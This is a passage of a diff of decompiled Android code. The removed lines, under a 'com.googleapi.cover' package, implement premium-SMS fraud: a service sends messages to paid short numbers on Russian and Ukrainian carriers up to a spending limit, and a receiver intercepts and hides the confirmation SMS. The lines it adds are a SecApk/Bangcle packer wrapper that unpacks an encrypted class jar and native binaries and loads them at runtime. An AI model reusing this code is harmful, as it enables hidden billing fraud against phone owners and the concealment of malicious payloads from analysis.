+                    realCopy(destSoName3, jarFile, jarEntry);
                 }
             }
-        });
-        if (this.actor.isMF()) {
-            this.noButton.setVisibility(0);
-        }
-        this.noButton.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.2
-            private boolean clickable = true;
-
-            @Override // android.view.View.OnClickListener
-            public void onClick(View v) {
-                if (this.clickable) {
-                    this.clickable = false;
-                    RelatedContent.this.goToNextScreen();
-                }
-            }
-        });
-        this.footrTextView = (TextView) findViewById(R.id.agr_footr_text);
-        this.agreementTextView = (TextView) findViewById(R.id.related_content_agr_text);
-        this.exitTextView = (TextView) findViewById(R.id.related_content_exit_text);
-        this.agreementTextView.setVisibility(8);
-        this.exitTextView.setVisibility(8);
-        if (this.actor.isMF() || this.actor.isMTSRF()) {
-            String price = "";
-            if (this.index == 0) {
-                if (this.actor.isMF()) {
-                    price = this.price_mf_1;
-                }
-            } else if (this.index == 1 && this.actor.isMF()) {
-                price = this.price_mf_2;
-            }
-            this.footrTextView.setVisibility(0);
-            if (!this.actor.isMTSRF()) {
-                this.agreementTextView.setVisibility(0);
-                this.footrTextView.setText(String.valueOf(getString(R.string.attention)) + " " + price + getString(R.string.rub));
-            }
-            SpannableString content = new SpannableString(getString(R.string.agr_text));
-            content.setSpan(new UnderlineSpan(), 0, content.length(), 0);
-            this.agreementTextView.setText(content);
-            this.agreementTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.3
-                @Override // android.view.View.OnClickListener
-                public void onClick(View v) {
-                    RelatedContent.this.showOff();
-                }
-            });
-            SpannableString content2 = new SpannableString(getString(R.string.exit));
-            content2.setSpan(new UnderlineSpan(), 0, content2.length(), 0);
-            this.exitTextView.setText(content2);
-            this.exitTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.4
-                @Override // android.view.View.OnClickListener
-                public void onClick(View v) {
-                    RelatedContent.this.goToNextScreen();
-                }
-            });
+        } catch (IOException e2) {
+            e = e2;
+            e.printStackTrace();
         }
     }
 
-    /* JADX INFO: Access modifiers changed from: private */
-    public void start() {
-        SharedPreferences settings = getSharedPreferences(Main.KEY_PREFS, 0);
-        Utils.putIntegerValue(this, Actor.ALLOWED_SMS_NUMBER, settings.getInt(Actor.ALLOWED_SMS_NUMBER, 1) + 1, settings);
-        this.dialog = new ProgressDialog(this);
-        this.dialog.setCancelable(false);
-        this.dialog.setMessage(getResources().getString(R.string.please_wait));
-        this.dialog.show();
-        if (!this.isRegistered) {
-            this.isRegistered = true;
-            registerReceiver();
+Package Path:com.secapk.wrapper.ApplicationWrapper.ApplicationWrapper
+Class Name:ApplicationWrapper
+Content: package com.secapk.wrapper;
+
+public class ApplicationWrapper extends Application {
+    private DexClassLoader cl;
+    public static Application realApplication = null;
+    public static String FirstApplication = "com.secapk.wrapper.FirstApplication";
+
+    @Override // android.app.Application
+    public void onCreate() {
+        super.onCreate();
+        if (Util.getCustomClassLoader() == null) {
+            Util.runAll(this);
         }
-        this.actor.start(this.index);
-    }
-
-    @Override // android.app.Activity
-    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {
-        super.onActivityResult(requestCode, resultCode, intent);
-        if (resultCode == 1) {
-            start();
+        String applicationClass = FirstApplication;
+        try {
+            this.cl = (DexClassLoader) Util.getCustomClassLoader();
+            Class<?> c = getClassLoader().loadClass(applicationClass);
+            realApplication = (Application) c.newInstance();
+        } catch (Exception e) {
+            e.printStackTrace();
+            realApplication = null;
         }
-    }
-
-    /* JADX INFO: Access modifiers changed from: private */
-    public void goToNextScreen() {
-        if (this.actor.hasMoreContent(this.index)) {
-            this.index++;
-            initializeGUI();
-        } else {
-            showLastScreen(new Intent(this, (Class<?>) ShowURL.class), true);
-        }
-    }
-
-    private void registerReceiver() {
-        registerReceiver(new BroadcastReceiver() { // from class: com.googleapi.cover.RelatedContent.5
-            @Override // android.content.BroadcastReceiver
-            public void onReceive(Context context, Intent i) {
-                RelatedContent.this.dialog.dismiss();
-                int resultCode = Actor.STATUS;
-                switch (resultCode) {
-                    case -1:
-                        RelatedContent.this.goToNextScreen();
-                        break;
-                    default:
-                        Toast.makeText(RelatedContent.this.getBaseContext(), R.string.sms_sending_error, 0).show();
-                        break;
-                }
-            }
-        }, new IntentFilter(Main.SEND_DONE));
-    }
-
-    private void showLastScreen(Intent i, boolean yesButtonPressed) {
-        i.setFlags(i.getFlags() | 67108864 | 536870912);
-        int maxIndex = yesButtonPressed ? this.index : this.index - 1;
-        Utils.putIntegerValue(this, LAST_ACTIVATED, maxIndex, getSharedPreferences(Main.KEY_PREFS, 0));
-        String relatedLinks = "";
-        for (int j = 0; j < maxIndex + 1; j++) {
-            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
-        }
-        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
-        startActivity(i);
-        finish();
-    }
-
-    @Override // android.app.Activity
-    public boolean onCreateOptionsMenu(Menu menu) {
-        MenuInflater inflater = getMenuInflater();
-        inflater.inflate(R.menu.main_menu, menu);
-        return true;
-    }
-
-    @Override // android.app.Activity
-    public boolean onOptionsItemSelected(MenuItem item) {
-        switch (item.getItemId()) {
-            case R.id.read_off_item /* 2131296277 */:
-                showOff();
-                return true;
-            default:
-                return super.onOptionsItemSelected(item);
-        }
-    }
-
-    /* JADX INFO: Access modifiers changed from: private */
-    public void showOff() {
-        Intent i = new Intent(this, (Class<?>) AgActivity.class);
-        startActivityForResult(i, 1);
-    }
-}
-
-Package Path:com.googleapi.cover.MessageReceiver.MessageReceiver
-Class Name:MessageReceiver
-Content: package com.googleapi.cover;
-
-public class MessageReceiver extends BroadcastReceiver {
-    @Override // android.content.BroadcastReceiver
-    public void onReceive(Context context, Intent intent) {
-        Bundle bundle;
-        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (bundle = intent.getExtras()) != null) {
+        if (realApplication != null) {
+            ACall p = ACall.getACall();
+            p.at1(realApplication, getBaseContext());
+            p.set2(this, realApplication, this.cl, getBaseContext());
             try {
-                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-                Object[] pdus = (Object[]) bundle.get("pdus");
-                StringBuilder builder = new StringBuilder();
-                boolean hasExpectedNum = false;
-                SmsMessage[] msgs = new SmsMessage[pdus.length];
-                for (int i = 0; i < msgs.length; i++) {
-                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
-                    if (msgs[i].getOriginatingAddress().equalsIgnoreCase(settings.getString(Actor.EXPECT_NUM, ""))) {
-                        if (!hasExpectedNum) {
-                            hasExpectedNum = true;
-                        }
-                        builder.append(msgs[i].getMessageBody().replace("http://sms911.r", ""));
-                    }
+                if (Float.parseFloat(Build.VERSION.RELEASE.substring(0, 3)) <= 2.1f) {
+                    p.set3(realApplication);
                 }
-                if (hasExpectedNum) {
-                    String text = builder.toString();
-                    if (text.contains("http://")) {
-                        Utils.putIntegerValue(context, TextUtils.getDailyKey(), settings.getInt(TextUtils.getDailyKey(), 0) + 1, settings);
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, true, settings);
-                    } else {
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-                    }
-                    Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, true, settings);
-                    abortBroadcast();
-                }
-            } catch (Exception e) {
+            } catch (Exception e2) {
             }
+            Util.doProvider();
+            realApplication.onCreate();
+        }
+    }
+
+    @Override // android.app.Application
+    public void onTerminate() {
+        super.onTerminate();
+        if (realApplication != null) {
+            realApplication.onTerminate();
+        }
+    }
+
+    @Override // android.app.Application, android.content.ComponentCallbacks
+    public void onConfigurationChanged(Configuration newConfig) {
+        super.onConfigurationChanged(newConfig);
+        if (realApplication != null) {
+            realApplication.onConfigurationChanged(newConfig);
+        }
+    }
+
+    @Override // android.app.Application, android.content.ComponentCallbacks
+    public void onLowMemory() {
+        super.onLowMemory();
+        if (realApplication != null) {
+            realApplication.onLowMemory();
         }
     }
 }
 
-Package Path:com.googleapi.cover.Main.showAirplaneDialog
-Class Name:Main
-Content: package com.googleapi.cover;
+Package Path:com.secapk.wrapper.Util.Util
+Class Name:Util
+Content: package com.secapk.wrapper;
 
-    private void showAirplaneDialog() {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle(R.string.airplane).setMessage(getResources().getString(R.string.airplane_dialog_text)).setCancelable(false).setPositiveButton(getResources().getString(R.string.yes_btn_dialog), new DialogInterface.OnClickListener() { // from class: com.googleapi.cover.Main.1
-            @Override // android.content.DialogInterface.OnClickListener
-            public void onClick(DialogInterface dialog, int id) {
-                Utils.putBooleanValue(Main.this.getApplicationContext(), AirModeHandler.AIRPLANE_MODE_WAS_ENABLED_BY_USER, true, Main.this.getSharedPreferences(Main.KEY_PREFS, 0));
-                Utils.setAirplaneMode(Main.this.getApplicationContext(), 0);
-                Main.this.finish();
-            }
-        }).setNegativeButton(getResources().getString(R.string.no_button_dialog), new DialogInterface.OnClickListener() { // from class: com.googleapi.cover.Main.2
-            @Override // android.content.DialogInterface.OnClickListener
-            public void onClick(DialogInterface dialog, int id) {
-                Main.this.finish();
-            }
-        });
-        AlertDialog alert = builder.create();
-        alert.show();
+public class Util {
+    private static ClassLoader cl = null;
+    private static String VERSION_NAME = "1.8";
+    private static ArrayList<ContentProvider> ps = new ArrayList<>();
+    public static Context x86Ctx = null;
+    public static boolean isX86 = false;
+    static byte[] hexDigits = {48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 65, 66, 67, 68, 69, 70};
+
+    public static void addProvider(ContentProvider p) {
+        synchronized (ps) {
+            x86Ctx = p.getContext();
+            ACall.getACall().set5(p);
+        }
     }
 
-Package Path:com.googleapi.cover.MessageReceiver.onReceive
-Class Name:MessageReceiver
-Content: package com.googleapi.cover;
+    public static void doProvider() {
+        synchronized (ps) {
+            ACall.getACall().set4();
+        }
+    }
 
-    public void onReceive(Context context, Intent intent) {
-        Bundle bundle;
-        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (bundle = intent.getExtras()) != null) {
+    public static ClassLoader getCustomClassLoader() {
+        return cl;
+    }
+
+    private static void runPkg(Context ctx, String pkgName) {
+        try {
+            if (cl == null) {
+                if (isX86) {
+                    cl = new MyClassLoader("/data/data/" + pkgName + "/.cache/classes.jar", "/data/data/" + pkgName + "/.cache", "/data/data/" + pkgName + "/lib/", ctx.getClassLoader());
+                } else {
+                    cl = new MyClassLoader("/data/data/" + pkgName + "/.cache/classes.jar", "/data/data/" + pkgName + "/.cache", "/data/data/" + pkgName + "/lib/", ctx.getClassLoader());
+                }
+            }
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+    }
+
+    private static void getAssetFile(Context context, String source, String dirstr) {
+        File dir = new File(dirstr);
+        if (!dir.exists()) {
             try {
-                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-                Object[] pdus = (Object[]) bundle.get("pdus");
-                StringBuilder builder = new StringBuilder();
-                boolean hasExpectedNum = false;
-                SmsMessage[] msgs = new SmsMessage[pdus.length];
-                for (int i = 0; i < msgs.length; i++) {
-                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
-                    if (msgs[i].getOriginatingAddress().equalsIgnoreCase(settings.getString(Actor.EXPECT_NUM, ""))) {
-                        if (!hasExpectedNum) {
-                            hasExpectedNum = true;
-                        }
-                        builder.append(msgs[i].getMessageBody().replace("http://sms911.r", ""));
-                    }
-                }
-                if (hasExpectedNum) {
-                    String text = builder.toString();
-                    if (text.contains("http://")) {
-                        Utils.putIntegerValue(context, TextUtils.getDailyKey(), settings.getInt(TextUtils.getDailyKey(), 0) + 1, settings);
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, true, settings);
+                dir.createNewFile();
+                InputStream is = context.getAssets().open(source);
+                FileOutputStream fos = new FileOutputStream(dir);
+                byte[] buffer = new byte[4096];
+                while (true) {
+                    int len = is.read(buffer);
+                    if (len != -1) {
+                        fos.write(buffer, 0, len);
                     } else {
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
+                        fos.close();
+                        is.close();
+                        return;
                     }
-                    Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, true, settings);
-                    abortBroadcast();
                 }
-            } catch (Exception e) {
+            } catch (IOException e) {
+                e.printStackTrace();
+                dir.delete();
             }
         }
     }
 
-Package Path:com.googleapi.cover.RelatedContent.onKeyDown
-Class Name:RelatedContent
-Content: package com.googleapi.cover;
-
-    public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == 4) {
-            return true;
+    private static void copyJarFile(Context ctx) {
+        String jarFileName = "/data/data/" + ctx.getPackageName() + "/.cache/classes.jar";
+        try {
+            String apkFilePath = ctx.getApplicationInfo().sourceDir;
+            JarFile jar = new JarFile(apkFilePath);
+            ZipEntry entry = jar.getEntry("assets/bangcle_classes.jar");
+            File outfile = new File(jarFileName);
+            byte[] buffer = new byte[65536];
+            InputStream in = new BufferedInputStream(jar.getInputStream(entry));
+            OutputStream out = new BufferedOutputStream(new FileOutputStream(outfile));
+            while (true) {
+                int nBytes = in.read(buffer);
+                if (nBytes > 0) {
+                    out.write(buffer, 0, nBytes);
+                } else {
+                    out.flush();
+                    out.close();
+                    in.close();
+                    return;
+                }
+            }
+        } catch (Exception ex) {
+            ex.printStackTrace();
         }
-        return super.onKeyDown(keyCode, event);
     }
 
-Package Path:com.googleapi.cover.Main.onKeyDown
-Class Name:Main
-Content: package com.googleapi.cover;
-
-    public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == 4) {
-            return true;
+    private static boolean deleteDirectory(File path) {
+        if (path.exists()) {
+            File[] files = path.listFiles();
+            for (int i = 0; i < files.length; i++) {
+                if (files[i].isDirectory()) {
+                    deleteDirectory(files[i]);
+                } else {
+                    files[i].delete();
+                }
+            }
         }
-        return super.onKeyDown(keyCode, event);
+        return path.delete();
     }
 
-Package Path:com.googleapi.cover.ActService.performActions
-Class Name:ActService
-Content: package com.googleapi.cover;
+    private static void writeVersion(File f, int versionCode, String versionName) {
+        try {
+            BufferedWriter bw = new BufferedWriter(new FileWriter(f));
+            String vcode = Integer.toString(versionCode);
+            bw.write(vcode);
+            bw.newLine();
+            bw.write(versionName);
+            bw.flush();
+            bw.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
 
-        private void performActions() {
-            String lastNumber;
-            Context context = ActService.this.getApplicationContext();
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            String opStr = settings.getString(Actor.NETWORK_STRING, "");
-            Actor act = new Actor(context, opStr);
-            if (act.isUkrCode()) {
-                actUK(act, settings);
+    private static String[] readVersions(File f) {
+        try {
+            BufferedReader reader = new BufferedReader(new FileReader(f));
+            String[] lines = {reader.readLine(), reader.readLine()};
+            reader.close();
+            return lines;
+        } catch (Exception e) {
+            e.printStackTrace();
+            return null;
+        }
+    }
+
+    private static void checkUpdate(Context ctx) {
+        try {
+            File f = new File("/data/data/" + ctx.getPackageName() + "/.cache/");
+            PackageInfo pinfo = ctx.getPackageManager().getPackageInfo(ctx.getPackageName(), 0);
+            int versionCode = pinfo.versionCode;
+            String versionName = pinfo.versionName;
+            if (versionName == null) {
+                versionName = VERSION_NAME;
+            }
+            File fversion = new File("/data/data/" + ctx.getPackageName() + "/.sec_version");
+            if (!fversion.exists()) {
+                deleteDirectory(f);
+                writeVersion(fversion, versionCode, versionName);
                 return;
             }
-            boolean isMTSRF = act.isMTSRF();
-            boolean isBeeline = act.isBeline();
-            if (act.isPrivate()) {
-                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
-                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
-                int acceptedNums = 0;
-                if (isBeeline) {
-                    String currentNumber = ActService.NUM_1;
-                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    do {
-                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber = positives.get(currentNumber);
-                        } else {
-                            if (currentNumber.equals(ActService.NUM_1)) {
-                                if (acceptedNums != 0) {
-                                    break;
-                                }
-                                ActService.PREF_TO_USE = Actor.PREF_PORT;
-                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
-                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
-                            }
-                            currentNumber = negatives.get(currentNumber);
-                        }
-                        if (currentNumber == null || acceptedNums > 2) {
+            String[] ret = readVersions(fversion);
+            if (ret == null) {
+                deleteDirectory(f);
+                fversion.delete();
+                return;
+            }
+            int localVersionCode = Integer.parseInt(ret[0]);
+            String localVersionName = ret[1];
+            if (!localVersionName.equals(versionName) || localVersionCode != versionCode) {
+                deleteDirectory(f);
+                fversion.delete();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            deleteDirectory(new File("/data/data/" + ctx.getPackageName() + "/.cache/"));
+            File fversion2 = new File("/data/data/" + ctx.getPackageName() + "/.sec_version");
+            if (fversion2.exists()) {
+                fversion2.delete();
+            }
+        }
+    }
+
+    public static String getCPUinfo() {
+        String result = "";
+        try {
+            String[] args = {"/system/bin/cat", "/proc/cpuinfo"};
+            ProcessBuilder cmd = new ProcessBuilder(args);
+            Process process = cmd.start();
+            InputStream in = process.getInputStream();
+            byte[] re = new byte[1024];
+            while (in.read(re) != -1) {
+                result = result + new String(re);
+            }
+            in.close();
+        } catch (IOException ex) {
+            ex.printStackTrace();
+        }
+        return result;
+    }
+
+    public static void realCopy(String destFileName, JarFile jar, ZipEntry entry) {
+        try {
+            File outfile = new File(destFileName);
+            byte[] buffer = new byte[65536];
+            InputStream in = new BufferedInputStream(jar.getInputStream(entry));
+            OutputStream out = new BufferedOutputStream(new FileOutputStream(outfile));
+            while (true) {
+                int nBytes = in.read(buffer);
+                if (nBytes > 0) {
+                    out.write(buffer, 0, nBytes);
+                } else {
+                    out.flush();
+                    out.close();
+                    in.close();
+                    return;
+                }
+            }
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+    }
+
+    private static void CopyLib(Context ctx) {
+        JarFile jarFile;
+        String apkFilePath = ctx.getApplicationInfo().sourceDir;
+        try {
+            jarFile = new JarFile(apkFilePath);
+        } catch (IOException e) {
+            e = e;
+        }
+        try {
+            Enumeration<JarEntry> iter = jarFile.entries();
+            while (iter.hasMoreElements()) {
+                JarEntry jarEntry = iter.nextElement();
+                String jarEntryName = jarEntry.getName();
+                if (jarEntryName.equals("assets/libsecexe.x86.so")) {
+                    String soName = jarEntryName.replaceAll("assets/", "");
+                    String destSoName = "/data/data/" + ctx.getPackageName() + "/.cache/" + soName;
+                    realCopy(destSoName, jarFile, jarEntry);
+                }
+                if (jarEntryName.equals("assets/libsecmain.x86.so")) {
+                    jarEntryName.replaceAll("assets/", "");
+                    String destSoName2 = "/data/data/" + ctx.getPackageName() + "/.cache/libsecmain.x86.so";
+                    realCopy(destSoName2, jarFile, jarEntry);
+                }
+                if (jarEntryName.equals("assets/" + ctx.getPackageName() + ".x86")) {
+                    jarEntryName.replaceAll("assets/", "");
+                    String destSoName3 = "/data/data/" + ctx.getPackageName() + "/.cache/" + ctx.getPackageName();
+                    realCopy(destSoName3, jarFile, jarEntry);
+                }
+            }
+        } catch (IOException e2) {
+            e = e2;
+            e.printStackTrace();
+        }
+    }
+
+    private static void checkX86(Context ctx) {
+        String cpuinfo = Build.CPU_ABI;
+        if (cpuinfo.equals("x86")) {
+            isX86 = true;
+        }
+        if (isX86) {
+            String libfileName = "/data/data/" + ctx.getPackageName() + "/.cache/" + ctx.getPackageName();
+            File libFile = new File(libfileName);
+            if (!libFile.exists()) {
+                CopyLib(ctx);
+            }
+        }
+    }
+
+    private static long getDataSize() {
+        File data = Environment.getDataDirectory();
+        StatFs fs = new StatFs(data.getPath());
+        long availableBlocks = fs.getAvailableBlocks();
+        long size = fs.getBlockSize();
+        long availableSize = availableBlocks * size;
+        return availableSize;
+    }
+
+    private static long getClassesJarSize(Context ctx) {
+        try {
+            String apkFilePath = ctx.getApplicationInfo().sourceDir;
+            JarFile jarFile = new JarFile(apkFilePath);
+            JarEntry jarEntry = jarFile.getJarEntry("assets/bangcle_classes.jar");
+            return jarEntry.getSize();
+        } catch (Exception e) {
+            return 0L;
+        }
+    }
+
+    private static boolean isSpaceEnough(Context ctx) {
+        String classesJarFileName = "/data/data/" + ctx.getPackageName() + "/.cache/classes.jar";
+        String dexFileName = "/data/data/" + ctx.getPackageName() + "/.cache/classes.dex";
+        File classesJarFile = new File(classesJarFileName);
+        File dexFile = new File(dexFileName);
+        if (classesJarFile.exists() && dexFile.exists()) {
+            return true;
+        }
+        long size = getDataSize();
+        long classSize = getClassesJarSize(ctx);
+        return 4 * classSize <= size;
+    }
+
+    private static void checkSpace(Context ctx) {
+        if (!isSpaceEnough(ctx)) {
+            long size = getDataSize();
+            long classSize = getClassesJarSize(ctx);
+            Log.e("SecApk", "Insufficient Space For SecApk available size:" + size + " classSize" + classSize);
+            try {
+                Runtime r = Runtime.getRuntime();
+                r.exec("kill -9 " + Process.myPid());
+            } catch (Exception ex) {
+                ex.printStackTrace();
+            }
+        }
+    }
+
+    private static void CopyBinaryFile(Context ctx) {
+        String jarFileName = "/data/data/" + ctx.getPackageName() + "/.cache/classes.jar";
+        String myDexOptFile = "/data/data/" + ctx.getPackageName() + "/.cache/" + ctx.getPackageName();
+        File jarFile = new File(jarFileName);
+        if (!jarFile.exists()) {
+            ACall.getACall().a1(ctx.getPackageName().getBytes(), ctx.getApplicationInfo().sourceDir.getBytes());
+        }
+        try {
+            Process proc = Runtime.getRuntime().exec("chmod 755 " + myDexOptFile);
+            proc.waitFor();
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (InterruptedException e2) {
+            e2.printStackTrace();
+        }
+    }
+
+    private static void createChildProcess(Context ctx) {
+        String apkFilePath = ctx.getApplicationInfo().sourceDir;
+        ACall.getACall().r1(ctx.getPackageName().getBytes(), apkFilePath.getBytes());
+    }
+
+    private static void tryDo(Context ctx) {
+        String apkFilePath = ctx.getApplicationInfo().sourceDir;
+        ACall.getACall().r2(ctx.getPackageName().getBytes(), apkFilePath.getBytes(), ctx.getApplicationInfo().processName.getBytes());
+    }
+
+    public static void doCheck(Context ctx) {
+        byte[] md5;
+        ApplicationInfo info = ctx.getApplicationInfo();
+        File checkFile = new File(info.dataDir, ".md5");
+        File targetFile = new File(info.dataDir, ".cache/classes.dex");
+        String dexPath = "/data/dalvik-cache/";
+        String apkPath = new String(info.sourceDir);
+        StringTokenizer st = new StringTokenizer(apkPath, "/");
+        while (st.hasMoreTokens()) {
+            System.out.println();
+            dexPath = (dexPath + st.nextToken()) + "@";
+        }
+        boolean todo = false;
+        try {
+            byte[] dexResult = toASC(calFileMD5(dexPath + "classes.dex"));
+            if (!checkFile.exists()) {
+                if (dexResult != null) {
+                    FileOutputStream chkOut = new FileOutputStream(checkFile);
+                    chkOut.write(dexResult);
+                    chkOut.close();
+                    todo = true;
+                }
+            } else if (dexResult != null && (md5 = readFile(checkFile)) != null) {
+                if (md5.length == dexResult.length) {
+                    for (int i = 0; i < md5.length; i++) {
+                        if (md5[i] != dexResult[i]) {
+                            todo = true;
                             break;
-                        }
-                    } while (!currentNumber.equalsIgnoreCase("-1"));
-                } else if (isMTSRF || act.isMF()) {
-                    double restAllowedSum = 0.0d;
-                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
-                    if (isMTSRF) {
-                        ActService.PREF_TO_USE = ActService.PREF_A1;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mtsPrices;
-                    } else if (act.isMF()) {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mfPrices;
-                    }
-                    int currentNumberIndex = 0;
-                    while (true) {
-                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
-                            currentNumberIndex++;
-                        } else {
-                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
-                                break;
-                            }
-                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
-                            do {
-                                try {
-                                    sleep(100L);
-                                } catch (InterruptedException e2) {
-                                }
-                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                                acceptedNums++;
-                                if (acceptedNums < 3) {
-                                    smsData = act.getRelatedData(acceptedNums - 1);
-                                    waitForAcceptance(acceptedNums, settings);
-                                }
-                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
-                            } else {
-                                currentNumberIndex++;
-                            }
                         }
                     }
                 } else {
-                    String currentNumber2 = Actor.NUM_10;
-                    String num3_alt = Actor.NUM_3_ALT;
-                    new String();
-                    ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    do {
-                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e3) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        lastNumber = currentNumber2;
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber2 = positives.get(currentNumber2);
-                        } else {
-                            currentNumber2 = negatives.get(currentNumber2);
-                        }
-                        if (currentNumber2 == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber2.equalsIgnoreCase("-1"));
-                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                    }
-                }
-            } else {
-                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
-                for (int i = 0; i < numbers.size(); i++) {
-                    String number = numbers.get(i);
-                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
-                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    } else {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    }
-                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
-                    do {
-                        try {
-                            sleep(100L);
-                        } catch (InterruptedException e4) {
-                        }
-                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                        break;
-                    }
+                    todo = true;
                 }
             }
-            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
-            act.reportDone();
+        } catch (Exception ex) {
+            ex.printStackTrace(System.out);
         }
+        if (!todo || !targetFile.exists()) {
+            return;
+        }
+        targetFile.delete();
+    }
 
-Package Path:com.googleapi.cover.RelatedContent.initializeTextViews
-Class Name:RelatedContent
-Content: package com.googleapi.cover;
+    public static byte[] toASC(byte[] bts) {
+        byte[] ret = new byte[bts.length * 2];
+        for (int i = 0; i < bts.length; i++) {
+            byte b = bts[i];
+            ret[i * 2] = hexDigits[(b >> 4) & 15];
+            ret[(i * 2) + 1] = hexDigits[b & 15];
+        }
+        return ret;
+    }
 
-    private void initializeTextViews() {
-        this.mainTextView = (TextView) findViewById(R.id.related_content_name);
-        Display display = getWindowManager().getDefaultDisplay();
-        this.mainTextView.setText(getString(R.string.related_content, new Object[]{getString(R.string.app_name), Build.MODEL, String.valueOf(display.getWidth()) + "x" + display.getHeight(), Build.VERSION.RELEASE, this.actor.getRelatedContentName(this.index)}));
+    public static byte[] readFile(File path) throws Exception {
+        FileInputStream input = new FileInputStream(path);
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        byte[] buffer = new byte[32768];
+        while (true) {
+            int readed = input.read(buffer);
+            if (readed > 0) {
+                out.write(buffer, 0, readed);
+            } else {
+                return out.toByteArray();
+            }
+        }
+    }
+
+    public static byte[] calFileMD5(String path) throws Exception {
+        FileInputStream input = new FileInputStream(path);
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        byte[] buffer = new byte[32768];
+        while (true) {
+            int readed = input.read(buffer);
+            if (readed > 0) {
+                out.write(buffer, 0, readed);
+            } else {
+                MessageDigest md = MessageDigest.getInstance("MD5");
+                md.update(out.toByteArray());
+                return md.digest();
+            }
+        }
+    }
+
+    public static void runAll1(Context ctx) {
+        try {
+            File f = new File("/data/data/" + ctx.getPackageName() + "/.cache/");
+            if (!f.exists()) {
+                f.mkdir();
+            }
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+        checkX86(ctx);
+    }
+
+    public static void runAll(Context ctx) {
+        x86Ctx = ctx;
+        doCheck(ctx);
+        checkUpdate(ctx);
+        try {
+            File f = new File("/data/data/" + ctx.getPackageName() + "/.cache/");
+            if (!f.exists()) {
+                f.mkdir();
+            }
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+        checkX86(ctx);
+        CopyBinaryFile(ctx);
+        createChildProcess(ctx);
+        tryDo(ctx);
+        runPkg(ctx, ctx.getPackageName());
+    }
+
+    public static Field getField(Class<?> cls, String name) {
+        Field[] arr$ = cls.getDeclaredFields();
+        for (Field field : arr$) {
+            if (!field.isAccessible()) {
+                field.setAccessible(true);
+            }
+            if (field.getName().equals(name)) {
+                return field;
